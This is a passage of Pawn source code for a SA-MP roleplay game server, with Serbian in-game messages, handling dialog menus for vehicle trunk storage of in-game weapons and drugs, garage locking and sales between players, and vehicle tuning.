			    else if( PlayerInfo[ playerid ][ xVoziloID ][ 2 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 2 ] ][ vID ] == vehicleid ) { }
			    else if( PlayerInfo[ playerid ][ xVoziloID ][ 3 ] != -1 && VehicleInfo[ PlayerInfo[ playerid ][ xVoziloID ][ 3 ] ][ vID ] == vehicleid ) { }
				else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
		    else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
		    
		    new autoid = getVehicleScriptID(vehicleid);
		    
		    switch( listitem ) {
				case 0: {
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) {
						SetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, 1, objective );
					} else {
						SetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, 0, objective );
					}
				}
				case 1: {
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) return SendErrorMessage( playerid, "Morate prvo otvoriti gepek." );
					
				    new wepname1[32],
						wepname2[32],
						wepname3[32],
						drug1 = VehicleInfo[ autoid ][ vDrugCode ][ 0 ],
						drug2 = VehicleInfo[ autoid ][ vDrugCode ][ 1 ],
						drug3 = VehicleInfo[ autoid ][ vDrugCode ][ 2 ],
						drug4 = VehicleInfo[ autoid ][ vDrugCode ][ 3 ],
						drug5 = VehicleInfo[ autoid ][ vDrugCode ][ 4 ],
						drug6 = VehicleInfo[ autoid ][ vDrugCode ][ 5 ];

	                if( VehicleInfo[ autoid ][ vWeap1 ] != 0 )
					    format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap1 ] ] );
					else
						strmid(wepname1, "None", 0, 5);

					if( VehicleInfo[ autoid ][ vWeap2 ] != 0)
					    format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap2 ] ] );
					else
					    strmid(wepname2, "None", 0, 5);

				    if( VehicleInfo[ autoid ][ vMelee ] != 0)
					    format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vMelee ] ] );
					else
						strmid(wepname3, "None", 0, 5);

	                strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	                strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
	                format( globalstring, sizeof( globalstring ), "Drug1: %s(%d g) | Drug2: %s(%d g)\n", GetDrugNameByDrugID(drug1), VehicleInfo[ autoid ][ vDrug ][ 0 ], GetDrugNameByDrugID(drug2), VehicleInfo[ autoid ][ vDrug ][ 1 ] );
	               	strcat( DialogStrgEx, globalstring );

	               	format( globalstring, sizeof( globalstring ), "Drug3: %s(%d g) | Drug4: %s(%d g)\n", GetDrugNameByDrugID(drug3), VehicleInfo[ autoid ][ vDrug ][ 2 ], GetDrugNameByDrugID(drug4), VehicleInfo[ autoid ][ vDrug ][ 3 ] );
	               	strcat( DialogStrgEx, globalstring );

	               	format( globalstring, sizeof( globalstring ), "Drug5: %s(%d g) | Drug6: %s(%d g)\n", GetDrugNameByDrugID(drug5), VehicleInfo[ autoid ][ vDrug ][ 4 ], GetDrugNameByDrugID(drug6), VehicleInfo[ autoid ][ vDrug ][ 5 ] );
	               	strcat( DialogStrgEx, globalstring );
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
	               	format( globalstring, sizeof( globalstring ), "Melee:[%s]\n", wepname3 );
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Slot 1:[%s]    |    Metaka: %d\n", wepname1, VehicleInfo[ autoid ][ vAmmo1 ] );
					strcat( DialogStrgEx, globalstring );

					format( globalstring, sizeof( globalstring ), "Slot 2:[%s]    |    Metaka: %d\n", wepname2, VehicleInfo[ autoid ][ vAmmo2 ] );
					strcat( DialogStrgEx, globalstring );
                    
                    strcat( DialogStrgEx, ""col_crvena"__________________________"col_white"__________________________\n");
	               	SPD( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "Potvrdi", "" );
	    			strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
				}
				case 2: {
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) return SendErrorMessage( playerid, "Morate prvo otvoriti gepek." );
					
				    ChosenVehicle[ playerid ] = autoid;
				    SPD( playerid, dialog_GEPEKOSTAVI, DSL, D_NASLOV, "Ostavi oruzje\nOstavi drogu", D_ODABERI, D_ODUSTANI );
				}
				case 3: {
				    GetVehicleParamsEx( vehicleid, engine, lights, alarm, doors, bonnet, boot, objective );
					if( boot == 0 ) return SendErrorMessage( playerid, "Morate prvo otvoriti gepek." );
					
				    ChosenVehicle[ playerid ] = autoid;
				    SPD( playerid, dialog_GEPEKIZVADI, DSL, D_NASLOV, "Izvadi oruzje\nIzvadi drogu", D_ODABERI, D_ODUSTANI );
				}
		    }
            return SendErrorMessage(playerid, "Iskljucena opcija do 30.01.2022!");
		}
	}
	else if( dialogid == dialog_GEPEKIZVADI ) {
		if( !response ) return true;
		if( response ) {
		    new vehicleid, found;
		    for( new i = 0; i < MAX_VEHICLES; i++) {
		        new Float:X, Float:Y, Float:Z;
		        GetVehiclePos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z)) {
		            vehicleid = i;
		            found = 1;
		            break;
		        }
		        else
		            continue;
		    }
			if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

		    new Float:vehPos[ 3 ];
			getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
			if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

			if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama.");
			if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) ) {
				SendErrorMessage( playerid, "Nepoznata akcija.");
				return 1;
			}

			new autoid = ChosenVehicle[ playerid ];
			if( VehicleInfo[ autoid ][ vUsage ] == PRIVATNO_VOZILO ) {
				if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true ) == 0 ) { }
				else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
		    else { }

			switch( listitem ) {
			    case 0: {
			        new wepname1[32], wepname2[32], wepname3[32];
				    if( VehicleInfo[ autoid ][ vMelee ] ==  0 && VehicleInfo[ autoid ][ vWeap1 ] == 0 && VehicleInfo[ autoid ][ vWeap2 ] == 0) return SendErrorMessage( playerid, "Svi slotovi su prazni!");
					if( VehicleInfo[ autoid ][ vWeap1 ] != 0)
					    format( wepname1, sizeof( wepname1 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap1 ] ] );
					else
					    format(wepname1, sizeof(wepname1), "None");

					if( VehicleInfo[ autoid ][vWeap2] != 0)
					    format( wepname2, sizeof( wepname2 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vWeap2 ] ] );
					else
					    format(wepname2, sizeof(wepname2), "None");

				    if( VehicleInfo[ autoid ][vMelee] != 0)
					    format( wepname3, sizeof( wepname3 ), "%s", WeapNames[ VehicleInfo[ autoid ][ vMelee ] ] );
					else
					    format(wepname3, sizeof(wepname3), "None");
				    TrunkVehicle[ playerid ] = autoid;
				    format( globalstring, sizeof( globalstring ), "%s\n%s\n%s", wepname1, wepname2, wepname3 );
					SPD( playerid, dialog_VEHICLEWEPTAKE, DSL, D_NASLOV, globalstring, D_ODABERI, D_ODUSTANI );
			    }
			    case 1: {
			        SPD( playerid, dialog_VEHICLETAKEDRUG, DSI, D_NASLOV, "Unesite slot droge u vozilu i kolicinu droge za uzimanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
			    }
			}
		}
	}
	
	else if( dialogid == dialog_GEPEKOSTAVI ) {
		if( !response ) return true;
		if( response ) {
		    new vehicleid, found;
		    for( new i = 0; i < MAX_VEHICLES; i++) {
		        new Float:X, Float:Y, Float:Z;
		        GetVehiclePos(i, X, Y, Z);
		        if( IsPlayerInRangeOfPoint( playerid, 5.0, X, Y, Z)) {
		            vehicleid = i;
		            found = 1;
		            break;
		        }
		        else
		            continue;
		    }
			if( found == 0 ) return SendErrorMessage( playerid, "Niste blizu vozila.");

		    new Float:vehPos[ 3 ];
			getPosBehindVehicle( vehicleid, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ], 0.0 );
			if( !IsPlayerInRangeOfPoint( playerid, 2, vehPos[ 0 ], vehPos[ 1 ], vehPos[ 2 ] ) ) return SendErrorMessage( playerid, "Morate biti pored prtljaznika." );

			if( IsANoTrunkVehicle( vehicleid ) ) return SendErrorMessage( playerid, "Ovo vozilo nema prtljaznik!");
			if( GetPlayerState( playerid ) != PLAYER_STATE_ONFOOT ) return SendErrorMessage( playerid, "Morate biti na nogama.");
			if( IsVehicleBajs( vehicleid ) || IsVehicleMotor( vehicleid ) || IsVehicleBrod( vehicleid ) ) {
				SendErrorMessage( playerid, "Nepoznata akcija.");
				return 1;
			}
			
			new autoid = ChosenVehicle[ playerid ];
			if( VehicleInfo[ autoid ][ vUsage ] == PRIVATNO_VOZILO ) {
				if( strcmp( ImeIgraca( playerid ), VehicleInfo[ autoid ][ vOwner ], true ) == 0 ) { }
				else return SendErrorMessage( playerid, "Nemate kljuceve ovog vozila.");
			}
		    else { }
		    
			switch( listitem ) {
			    case 0: {
			        if( GetFactionType( playerid ) == ORG_TIP_PD || GetFactionType( playerid ) == ORG_TIP_HITM ) {
				        SendErrorMessage( playerid, "PD/FBI/CIA/HITMAN nema razloga ubacivati oruzja u gepek!");
						return 1;
					}
                    if( NaDmEventu[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes ovo dok si na dmu." );
					new wepname[32];
					if( ForbiddenWeap( playerid ) ) return SendErrorMessage( playerid, "Ne mozes ubaciti zabranjena oruzja u gepek." );
					if( IsMeleeWeapon( GetWeapon( playerid ) ) && VehicleInfo[ autoid ][ vMelee ] != 0 ) return SendErrorMessage( playerid, "Slot za melee oruzja je zauzet!");
					if( !IsMeleeWeapon( GetWeapon( playerid )) && VehicleInfo[ autoid ][ vWeap1 ] != 0 && VehicleInfo[ autoid ][ vWeap2 ] != 0) return SCM(playerid, CRVENA, "Slotovi za vatrena oruzja su zauzeti!");
					if( IsMeleeWeapon( GetWeapon( playerid ) ) ) {
					    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                        antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				        VehicleInfo[ autoid ][ vMelee ] = GetWeapon( playerid );
				        RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
				        SaveVehicle( autoid );

					    format( globalstring, sizeof( globalstring ), "* %s sprema %s u prtljaznik.", ImeIgraca( playerid ), wepname);
						PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );

					}
					else if( VehicleInfo[ autoid ][ vWeap1 ] == 0) {
						if( ( VehicleInfo[ autoid ][ vAmmo1 ] + GetPlayerAmmo( playerid ) ) < 501 ) {
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                            antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				            VehicleInfo[ autoid ][ vAmmo1 ] = GetPlayerAmmo( playerid );
				            VehicleInfo[ autoid ][ vWeap1 ] = GetWeapon( playerid );
							RemovePlayerWeapon(playerid, GetWeapon( playerid ) );
							SaveVehicle( autoid );

							format( globalstring, sizeof( globalstring ), "* %s sprema %s u prtljaznik.", ImeIgraca( playerid ), wepname);
							PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );
						} else SCM(playerid, CRVENA, "U slot mozete staviti najvise 500 metaka!");
					}
					else if( VehicleInfo[ autoid ][ vWeap2 ] == 0) {
						if( ( VehicleInfo[ autoid ][ vAmmo2 ] + GetPlayerAmmo( playerid ) ) < 501) {
						    format( wepname, sizeof( wepname ), "%s", WeapNames[ GetWeapon( playerid ) ] );
                            antiCheatCS[ playerid ][ WeaponDetect ] = 3;
				            VehicleInfo[ autoid ][ vAmmo2 ] = GetPlayerAmmo( playerid );
				            VehicleInfo[ autoid ][ vWeap2 ] = GetWeapon( playerid );
							RemovePlayerWeapon( playerid, GetWeapon( playerid ) );
							SaveVehicle( autoid );

							format( globalstring, sizeof( globalstring ), "* %s sprema %s u prtljaznik.", ImeIgraca( playerid ), wepname);
							PorukaRadius(6.0, playerid, globalstring, LJUBICASTA );
						} else SCM(playerid, CRVENA, "U slot mozete staviti najvise 500 metaka!");
					}
			    }
			    case 1: {
			        SPD( playerid, dialog_VEHICLEPUTDRUG, DSI, D_NASLOV, "Unesite slot droge kod igraca i kolicinu droge za ostavljanje.\nPrimer: 1 232.", D_ODABERI, D_ODUSTANI );
			    }
			}
		}
	}
	else if( dialogid == dialog_GARAZA ) {
		if( !response ) return true;
		if( response ) {
			switch( listitem ) {
			    case 0: {
			        new string[ 128 ], status[ 20 ], id = PlayerInfo[ playerid ][ xGarageID ];
			        if( garageInfo[ id ][ garageLocked ] == true ) { status = "Zakljucano"; }
			        else { status = "Otkljucano"; }
			        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
                    strcat( DialogStrgEx, "__________________________________________________________________\n \n");
                    strcat( DialogStrgEx, "Garaza - Informacije\n \n" );
			        format( string, sizeof( string ), "Vlasnik garaze: [%s] | Cena garaze: [%d$]\n", garageInfo[ id ][ garageOwner ], garageInfo[ id ][ garagePrice ] );
			        strcat( DialogStrgEx, string );
			        format( string, sizeof( string ), "Level garaze: [%d] | Status brave: [%s]\n \n", garageInfo[ id ][ garageLevel ], status );
			        strcat( DialogStrgEx, string );
			        strcat( DialogStrgEx, "__________________________________________________________________");
			        ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
			    }
			    case 1: {
					if( GetNearestGarage( playerid ) != PlayerInfo[ playerid ][ xGarageID ] ) return SendErrorMessage( playerid, "Morate biti pored ulaza svoje garaze." );
					SPD( playerid, dialog_GARAGELOCK, DSMSG, D_NASLOV, "Odaberite opciju:", "Otkljucaj", "Zakljucaj" );
				}
			    case 2: {
				    new id = PlayerInfo[ playerid ][ xGarageID ];
				    if( GetNearestGarage( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje garaze!" );
			        if( strcmp( ImeIgraca( playerid ), garageInfo[ GetNearestGarage( playerid ) ][ garageOwner ], true) == 0 ) {
						SPD( playerid, dialog_GARAGESELLDRZAVA, DSMSG, D_NASLOV, "Da li ste sigurni da zelite prodati vasu garazu drzavi?", "Da", "Ne" );

					} else SendErrorMessage( playerid, "Ovo nije vase.." );
				}
				case 3: {
				    new id = PlayerInfo[ playerid ][ xGarageID ];
				    if( GetNearestGarage( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje garaze!" );
				    SPD( playerid, dialog_GARAGESELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu garaze", "Ponudi", D_ODUSTANI );
				}
			}
		}
	}
	else if( dialogid == dialog_GARAGESELLDRZAVA ) {
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas garazu dok ne izadjes iz minusa u banci." );
	        new id = PlayerInfo[ playerid ][ xGarageID ];
			if( GetNearestGarage( playerid ) != id ) return SendErrorMessage( playerid, "Niste pored svoje garaze!" );
			if( strcmp( ImeIgraca( playerid ), garageInfo[ GetNearestGarage( playerid ) ][ garageOwner ], true) == 0 ) {

				PlayerInfo[ playerid ][ xGarageID ] = -1;

                new string1[ 128 ]; 
				format( string1, sizeof( string1 ), "Igrac %s je prodao garazu ID %d na buy", ImeIgraca( playerid ), id );
				LogSave( "Ostalo/LogProdajaImovine.log", string1 );

		        strmid( garageInfo[ GetNearestGarage( playerid ) ][ garageOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
			    DajIgracuNovac( playerid, (garageInfo[ GetNearestGarage( playerid ) ][ garagePrice ]/2) );
				garageInfo[ GetNearestGarage( playerid ) ][ garageOwned ] = false; PlayerPlaySound( playerid, 1058, 0, 0, 0 );
				SavePlayer( playerid ); Garage_Refresh( GetNearestGarage( playerid ) ); Garage_Save( GetNearestGarage( playerid ) );

			} else SendErrorMessage( playerid, "Ovo nije vase.." );
	    }
	    if( !response ) {
	        SCM( playerid, -1, "Odustali ste od prodaje garaze drzavi" );
	    }
	}
	else if( dialogid == dialog_GARAGESELLTP ) {
	    if( !response ) return 1;
	    if( response ) {
	        if( PlayerInfo[ playerid ][ xBRacun ] < 0 ) return SendErrorMessage( playerid, "Ne mozes da prodas garazu dok ne izadjes iz minusa u banci." );
	        new id = PlayerInfo[ playerid ][ xGarageID ];
	        new idigraca, cena, string[ 128 ], Float:Pos[ 3 ];
	        if( sscanf( inputtext, "ui", idigraca, cena ) ) return SPD( playerid, dialog_GARAGESELLTP, DSI, D_NASLOV, "U prazni prostor ispod unesite ID igraca i cenu garaze", "Ponudi", D_ODUSTANI );
            GetPlayerPos( idigraca, Pos[0], Pos[1], Pos[2] );
			if( !IsPlayerInRangeOfPoint( playerid, 3.0, Pos[0], Pos[1], Pos[2] ) ) return SendErrorMessage( playerid, "Igrac nije blizu vas");
			if( cena < 1 ) return SendErrorMessage( playerid, "Cena ne moze biti manja od 1$!");
            if( idigraca == IPI ) return SendErrorMessage( playerid, "Pogresan ID." );
			if( idigraca == playerid ) return SendErrorMessage( playerid, "Ne mozes sam sebi prodati garazu!");
			if( PlayerInfo[ idigraca ][ xGarageID ] != -1 )return SendErrorMessage( playerid, "Igrac vec ima garazu!");
            if( PlayerInfo[ idigraca ][ xLevel ] < garageInfo[ id ][ garageLevel ] ) return SendClientMessageEx( playerid, CRVENA, "Da bi ste tom igracu prodali ovu garazu, on mora biti level %d+.", garageInfo[ id ][ garageLevel ] );
            SendClientMessageEx( playerid, SVETLOPLAVA, "Ponudili ste igracu %s garazu po ceni od %d.", ImeIgraca( idigraca ), cena );
			GlobalProdaja[ idigraca ] = playerid;
			GlobalCena[ idigraca ] = cena;
			GlobalID[ idigraca ] = id;
			format( string, sizeof( string ), "Igrac %s vam je ponudio da kupite njegovu garazu za %d", ImeIgraca( playerid ), cena );
			SPD( idigraca, dialog_ACCEPTGARAGE, DSMSG, D_NASLOV, string, "Prihvati", "Odbij" );
	    }
	}
	else if( dialogid == dialog_ACCEPTGARAGE ) {
	    if( response ) {
	        new id = GlobalID[ playerid ];
	        if( PlayerInfo[ playerid ][ xNovac ] < GlobalCena[ playerid ] ) return SendErrorMessage( playerid, "Nemate dovoljno novca.");

			PlayerInfo[ GlobalProdaja[ playerid ] ][ xGarageID ] = -1;

			PlayerInfo[ playerid ][ xGarageID ] = id;

            new string1[ 128 ]; 
			format( string1, sizeof( string1 ), "Igrac %s je prodao garazu ID %d igracu %s za %d", ImeIgraca( GlobalProdaja[ playerid ] ), id, ImeIgraca( playerid ), GlobalCena[ playerid ] );
			LogSave( "Ostalo/LogProdajaImovine.log", string1 );
			
            SendClientMessageEx( playerid, SVETLOPLAVA, "Uspesno ste kupili garazu od igraca %s za $d.", ImeIgraca( GlobalProdaja[ playerid ] ), GlobalCena[ playerid ] );
			strmid( garageInfo[ id ][ garageOwner ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), 255);
			Garage_Save( id ); Garage_Refresh( id );
			SavePlayer( playerid ); SavePlayer( GlobalProdaja[ playerid ] );
			format( globalstring, sizeof( globalstring ), "Prodali ste garazu igracu %s za %d!", ImeIgraca( playerid ), GlobalCena[ playerid ] );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			DajIgracuNovac( GlobalProdaja[ playerid ], GlobalCena[ playerid ] );
			DajIgracuNovac( playerid, -GlobalCena[ playerid ] );
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	    else if( !response ) {
			format( globalstring, sizeof( globalstring ),"Igrac %s je odbio vasu ponudu za kupovinu garaze!", ImeIgraca( playerid ) );
			SCM( GlobalProdaja[ playerid ], -1, globalstring );
			SCM( playerid, -1, "Odbili ste ponudu!");
			GlobalProdaja[ playerid ] = -1;
			GlobalCena[ playerid ] = -1;
			GlobalID[ playerid ] = -1;
	    }
	}
	else if( dialogid == dialog_GARAGELOCK ) {
	    new id = PlayerInfo[ playerid ][ xGarageID ];
	    if( GetNearestGarage( playerid ) != PlayerInfo[ playerid ][ xGarageID ] ) return SendErrorMessage( playerid, "Morate biti pored ulaza svoje garaze." );
		if( response ) {
		    if( garageInfo[ id ][ garageLocked ] == false ) return SendErrorMessage( playerid, "Garaza je vec otkljucana." );
		    garageInfo[ id ][ garageLocked ] = false;
			Garage_Save( id );
		    SendInfoMessage( playerid, "Otkljucao si svoju garazu." );
		}
		else if( !response ) {
		    if( garageInfo[ id ][ garageLocked ] == true ) return SendErrorMessage( playerid, "Garaza je vec zakljucana." );
		    garageInfo[ id ][ garageLocked ] = true;
			Garage_Save( id );
		    SendInfoMessage( playerid, "Zakljucao si svoju garazu." );
		}
	}
	
	else if( dialogid == dialog_TUNING ) {
	        if( response ) {
	            if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Morate biti u vozilu." );
	            if( GetPlayerState( playerid ) != PLAYER_STATE_DRIVER ) return SendErrorMessage( playerid, "Morate biti na mestu vozaca." );
				new vehicleid = GetPlayerVehicleID( playerid ), Float:Pos[ 6 ];

	            TPInfo[ playerid ][ tID ] = -1;

				switch( listitem ) {
	                case 0: {

						for( new i = 0; i < NUMBER_TYPE_PAINTJOB; i++ ) {
			                if( pjInfo[ i ][ vehID ] == GetVehicleModel( vehicleid ) ) {
				            	TPInfo[ playerid ][ tID ] = i;
								break;
							}
			           	}
						if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih boja za vas model auta." );

						new pid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tPaintjob ] = true;

						GetVehicleColor( vehicleid, TPInfo[ playerid ][ PJColor ][ 0 ], TPInfo[ playerid ][ PJColor ][ 1 ] );

						TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        ChangeVehicleColor( vehicleid, 1, 1 );
                        ChangeVehiclePaintjob( vehicleid, pjInfo[ pid ][ pNumber ] );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Paintjobs" );
	                    format( globalstring, sizeof( globalstring ), "%s", pjInfo[ pid ][ pNameBre ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 4, 0, 5 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
					}
	                case 1: {
						SPD( playerid, dialog_TUNING_2, DSI, D_NASLOV, "Unesi id boje 1 i id boje 2 boje koje zelis za svoje auto.\nFormat:0 1", D_ODABERI, D_ODUSTANI );
	                }
	                case 2: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_EXHAUST ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_EXHAUST;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Exhausts" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], -2, -5, 0 );
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 3: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_FRONT_BUMPER ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_FRONT_BUMPER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );
	                    
                        PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Front Bumper" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, 6, 0.5 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 4: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_REAR_BUMPER ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
	                    if( TPInfo[ playerid ][ tID ] == -1 ) return SendErrorMessage( playerid, "Nema kompatibilnih komponenti izabrane vrste za vas model auta." );

						new cid = TPInfo[ playerid ][ tID ];
						TPInfo[ playerid ][ tType ] = CARMODTYPE_REAR_BUMPER;
						TPInfo[ playerid ][ tPaintjob ] = false;

	                    TogglePlayerControllable( playerid, false );
	                    TuningTDShow( playerid, true );

						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 1 ], "Rear Bumper" );
	                    format( globalstring, sizeof( globalstring ), "%s", cInfo[ cid ][ cName ] );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 3 ], globalstring );
						format( globalstring, sizeof( globalstring ), "%s", GetVehicleNameEx( GetVehicleModel( vehicleid ) ) );
						PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

                        AddVehicleComponent( vehicleid, cInfo[ cid ][ cID ] );

						GetVehicleCameraPos( vehicleid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ], 0, -6, 0.5 ); // done
						SetPlayerCameraPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );

						GetVehiclePos( vehicleid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );
						SetPlayerCameraLookAt( playerid, Pos[ 0 ],Pos[ 1 ],Pos[ 2 ] );

						SelectTextDraw( playerid, SRVBOJA1 );
	                }
	                case 5: {

	                    for( new i = 0; i < MAX_COMPONENTS; i++ ) {
			                if( cInfo[ i ][ cType ] == CARMODTYPE_ROOF ) {
			                    if( cInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cInfo[ i ][ cID ] ) ) {
				                    TPInfo[ playerid ][ tID ] = i;
									break;
								}
			                }
						}
